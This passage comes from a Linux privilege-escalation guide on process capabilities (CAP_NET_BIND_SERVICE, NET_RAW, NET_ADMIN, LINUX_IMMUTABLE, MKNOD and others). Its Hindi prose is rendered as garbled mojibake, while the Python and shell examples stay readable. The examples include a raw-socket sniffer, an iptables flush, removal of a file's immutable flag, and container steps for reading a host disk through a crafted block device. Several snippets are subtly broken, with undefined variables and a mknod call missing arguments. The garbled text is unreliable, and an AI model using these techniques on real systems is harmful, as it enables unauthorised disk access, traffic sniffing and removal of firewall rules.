**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрдирдирд╛ рд╕рдВрднрд╡ рд╣реИ (рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдкреЛрд░реНрдЯ рдкрд░ рднреА)ред** рдЖрдк рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рдирд╣реАрдВ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ **`python`** рдХреЗ рдкрд╛рд╕ рдЗрд╕ рдХреНрд╖рдорддрд╛ рд╣реИ рддреЛ рдпрд╣ рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдкрд░ рд╕реБрди рд╕рдХреЗрдЧрд╛ рдФрд░ рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЛрд░реНрдЯ рдкрд░ рднреА рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдЧрд╛ (рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)ред

{% tabs %}
{% tab title="рд╕реБрдиреЗрдВ" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="рд╕рдВрдкрд░реНрдХ рдХрд░реЗрдВ" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдЙрдкрд▓рдмреНрдз рдиреЗрдЯрд╡рд░реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд▓рд┐рдП **RAW рдФрд░ PACKET рд╕реЙрдХреЗрдЯ рдкреНрд░рдХрд╛рд░** рдмрдирд╛ рд╕рдХреЗред рдЗрд╕рд╕реЗ рдЙрдкрдпреБрдХреНрдд рдбреЗрдЯрд╛ рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдФрд░ рдкреНрд░реЗрд╖рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдмрд╣реБрдд рд╕рд╛рд░реЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдпрд╣ рдЗрдВрдЯрд░рдлреЗрд╕ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдИрдерд░рдиреЗрдЯ рдбрд┐рд╡рд╛рдЗрд╕ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рд╕реЗ рдПрдХ рдЦрддрд░рдирд╛рдХ рдпрд╛ **рд╕рдВрдХрдЯрдордп рдХрдВрдЯреЗрдирд░** рд╡рд┐рднрд┐рдиреНрди рдиреЗрдЯрд╡рд░реНрдХ рдкрд░рддреЛрдВ рдореЗрдВ **рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдЫрд▓рдХрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЗрд╕ рдпреЛрдЧреНрдпрддрд╛ рд╡рд╛рд▓реА рдПрдХ рдЦрддрд░рдирд╛рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдпрд╛ рд╕рдВрдХрдЯрдордп рдХрдВрдЯреЗрдирд░ рджреНрд╡рд╛рд░рд╛ рдЙрдкрд╕реНрдерд┐рдд рдмреНрд░рд┐рдЬ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░ рд╕рдХрддреА рд╣реИ, рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдмреАрдЪ рдорд╛рд░реНрдЧрдирд┐рд░реНрдзрд╛рд░рдг рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреА рд╣реИ, рдиреЗрдЯрд╡рд░реНрдХ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рдХрд░ рд╕рдХрддреА рд╣реИ, рдФрд░ рдЕрдиреНрдпрдерд╛ рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЦрд┐рд▓рд╡рд╛рдбрд╝ рдХрд░ рд╕рдХрддреА рд╣реИ рдпрджрд┐ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдирд╣реАрдВ рд╣реИ рдЬреЛ рдкреИрдХреЗрдЯ рдкреНрд░рдХрд╛рд░ рдФрд░ рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИред рдЕрдВрдд рдореЗрдВ, рдпрд╣ рдпреЛрдЧреНрдпрддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдкрд▓рдмреНрдз рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдкрддреЗ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдпреЛрдЧреНрдпрддрд╛ рдЕрдзрд┐рдХрд╛рд░реА рдХрдВрдЯреЗрдирд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЖрдорддреМрд░ рдкрд░ рд░рдЦреА рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ рдкрд┐рдВрдЧ рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ ICMP рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП RAW рд╕реЙрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХреЗред

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред** рдЗрд╕ рдпреЛрдЧреНрдпрддрд╛ рдХреЗ рд╕рд╛рде рдЖрдк рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рдирд╣реАрдВ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдмрд╛рдЗрдирд░реА **`tcpdump`** рдЗрд╕ рдпреЛрдЧреНрдпрддрд╛ рдХреЛ рд░рдЦрддрд╛ рд╣реИ рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рд╕реВрдЪрдирд╛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХреЗрдВрдЧреЗред
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдпрджрд┐ **рдкрд░реНрдпрд╛рд╡рд░рдг** рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк **`tcpdump`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдирд┐рдл рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

**рджреНрд╡рд┐рдЖрдзрд╛рд░реА 2 рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг **`python2`** рдХреЛрдб рд╣реИ рдЬреЛ "**lo**" (**localhost**) рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдХреЛрдб [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) рдХреЗ рд▓реИрдм "_The Basics: CAP-NET\_BIND + NET\_RAW_" рд╕реЗ рд╣реИред
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдХреНрд╖рдорддрд╛ рдзрд╛рд░рдХ рдХреЛ рдЕрдирд╛рд╡рд░рдгрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреА рдлрд╝рд╛рдпрд░рд╡реЙрд▓, рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓, рд╕реЙрдХреЗрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ, рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдЕрдиреНрдп рд╕рдВрдмрдВрдзрд┐рдд рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╕рдВрдмрдВрдзрд┐рдд рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдкрд░ рд▓рдЧреЗ рдиреЗрдЯрд╡рд░реНрдХ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдмреАрдЪ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдЪрд▓реЛ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ **рдкрд╛рдпрдерди рдмрд╛рдЗрдирд░реА** рдХреЗ рдкрд╛рд╕ рдпреЗ рдХреНрд╖рдорддрд╛рдПрдВ рд╣реИрдВред
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрдиреЛрдб рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред** рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдЖрдк рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рдирд╣реАрдВ рд╕рдХрддреЗред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рд╛рдЗрд▓ immutable рд╣реИ рдФрд░ python рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдЖрдк **immutable рдЧреБрдг рдХреЛ рд╣рдЯрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрди рдпреЛрдЧреНрдп рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдорддреМрд░ рдкрд░ рдпрд╣ рдЕрд╡рд┐рдЪрд▓рдиреАрдп рдЧреБрдгрд╡рддреНрддрд╛ рд╕реЗрдЯ рдФрд░ рд╣рдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЬрд╛рддреА рд╣реИ:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдЪреВрдВрдХрд┐ `chroot(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд╕реЗ рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдФрд░ рднрд╛рдЧреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА `chroot(2)` рдкрд░реНрдпрд╛рд╡рд░рдг рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИ:

* [рд╡рд┐рднрд┐рдиреНрди chroot рд╕рдорд╛рдзрд╛рдиреЛрдВ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рддрд░реАрдХрд╛](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot рднрд╛рдЧрдиреЗ рдХрд╛ рдЙрдкрдХрд░рдг](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `reboot(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдХреЗ рд▓рд┐рдП `LINUX_REBOOT_CMD_RESTART2` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рднреА **рд░реАрдмреВрдЯ рдХрдорд╛рдВрдб** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдпрд╣ рдХреНрд╖рдорддрд╛ рдпрд╣ рднреА рд╕рдВрднрд╡ рдХрд░рддреА рд╣реИ рдХрд┐ `kexec_load(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЬреЛ рдПрдХ рдирдпрд╛ рдХреНрд░реИрд╢ рдХрд░реНрдирд▓ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ Linux 3.17 рдХреЗ рд░реВрдк рдореЗрдВ, `kexec_file_load(2)` рднреА рд▓реЛрдб рдХрд░реЗрдЧрд╛ рдЬреЛ рд╕рд╛рдЗрди рдХрд░реНрдирд▓ рд▓реЛрдб рдХрд░реЗрдЧрд╛ред

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдЕрдВрдд рдореЗрдВ Linux 2.6.37 рдореЗрдВ `CAP_SYS_ADMIN` рдХреИрдЪреЙрд▓ рд╕реЗ рдлреЛрд░реНрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдпрд╣ рдХреНрд╖рдорддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ `syslog(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ `/proc/sys/kernel/kptr_restrict` 1 рдкрд░ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░ `/proc` рдФрд░ рдЕрдиреНрдп рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рдХрд╕рд┐рдд рдХрд░реНрдирд▓ рдкрддреЛрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

`kptr_restrict` рд╕рд┐рд╕реНрдХрдЯрд▓ рд╕реЗрдЯрд┐рдВрдЧ 2.6.38 рдореЗрдВ рдкреЗрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдФрд░ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХрд░реНрдирд▓ рдкрддреЗ рд╡рд┐рдХрд╕рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВред рдпрд╣ 2.6.39 рдХреЗ рдмрд╛рдж рд╕реЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╢реВрдиреНрдп (рдХрд░реНрдирд▓ рдкрддреЗ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рдирд╛) рд╣реЛрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХрдИ рд╡рд┐рддрд░рдг рд╕рд╣реА рдорд╛рди рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ 1 (рд╕рднреА рдХреЛ рдЫрд┐рдкрд╛рдПрдВ рдХреЗрд╡рд▓ uid 0 рдХреЛ рдЫреЛрдбрд╝рдХрд░) рдпрд╛ 2 (рд╣рдореЗрд╢рд╛ рдЫрд┐рдкрд╛рдПрдВ)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдХреНрд╖рдорддрд╛ рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ `dmesg` рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдпрджрд┐ `dmesg_restrict` рд╕реЗрдЯрд┐рдВрдЧ 1 рд╣реЛрддреА рд╣реИред рдЕрдВрдд рдореЗрдВ, `CAP_SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдЕрднреА рднреА рдРрддрд┐рд╣рд╛рд╕рд┐рдХ рдХрд╛рд░рдгреЛрдВ рд╕реЗ `syslog` рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдорд┐рдд рдлрд╝рд╛рдЗрд▓ (`S_IFREG`), FIFO (рдирд╛рдорд┐рдд рдкрд╛рдЗрдк) (`S_IFIFO`), рдпрд╛ UNIX рдбреЛрдореЗрди рд╕реЙрдХреЗрдЯ (`S_IFSOCK`) рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рдФрд░ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реИрдВ:

* `S_IFCHR` (рд╡рд░реНрдг рд╕реНрдкреЗрд╢рд▓ рдлрд╝рд╛рдЗрд▓ (рдЯрд░реНрдорд┐рдирд▓ рдЬреИрд╕реА рдЙрдкрдХрд░рдг))
* `S_IFBLK` (рдмреНрд▓реЙрдХ рд╕реНрдкреЗрд╢рд▓ рдлрд╝рд╛рдЗрд▓ (рдбрд┐рд╕реНрдХ рдЬреИрд╕реА рдЙрдкрдХрд░рдг))ред

рдпрд╣ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХреНрд╖рдорддрд╛ рд╣реИ ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))ред

рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рддрд╣рдд, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд░реНрддреЛрдВ рдХреЗ рддрд╣рдд рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЗрд╕реНрдХреЗрд▓реЗрд╢рди (рдкреВрд░реЗ рдбрд┐рд╕реНрдХ рдкрдврд╝рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

1. рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП (рдЕрдиреБрдкреНрд░рдпреЛрдЧреА)ред
2. рдХрдВрдЯреЗрдирд░ рдкрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП (рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА (EUID 0), рдФрд░ рдкреНрд░рднрд╛рд╡реА `CAP_MKNOD`)ред
3. рд╣реЛрд╕реНрдЯ рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдПрдХ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдиреЗрдорд╕реНрдкреЗрд╕ рд╕рд╛рдЭрд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдЪрд░рдг :**

1. рд╣реЛрд╕реНрдЯ рдкрд░, рдПрдХ рдорд╛рдирдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ:
1. рд╡рд░реНрддрдорд╛рди UID рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (`id`)ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `uid=1000(unprivileged)`ред
2. рдЖрдк рдЬрд┐рд╕ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЙрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: `/dev/sda`
2. рдХрдВрдЯреЗрдирд░ рдкрд░, `рд░реВрдЯ` рдХреЗ рд░реВрдк рдореЗрдВ:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. рдореЗрдЬрдмрд╛рди рдкрд░ рд╡рд╛рдкрд╕:
```bash
#┬аFind the PID linked to the container owns by the user "unprivileged"
#┬аExample only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
#┬аBecause of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
рд╣рдорд▓рд╛рд╡рд░ рдЕрдм рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЙрдкрдХрд░рдг /dev/sda рдХреЛ рдкрдврд╝, рдбрдВрдк рдФрд░ рдХреЙрдкреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### CAP\_SETPCAP

**`CAP_SETPCAP`** рдПрдХ Linux рдХреНрд╖рдорддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рджреВрд╕рд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдкреНрд░рднрд╛рд╡реА, рд╡рд┐рд░рд╛рд╕рдд рдФрд░ рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рд╣рдЯрд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдореЗрдВ рдХреБрдЫ рдкреНрд░рддрд┐рдмрдВрдз рд╣реИрдВред

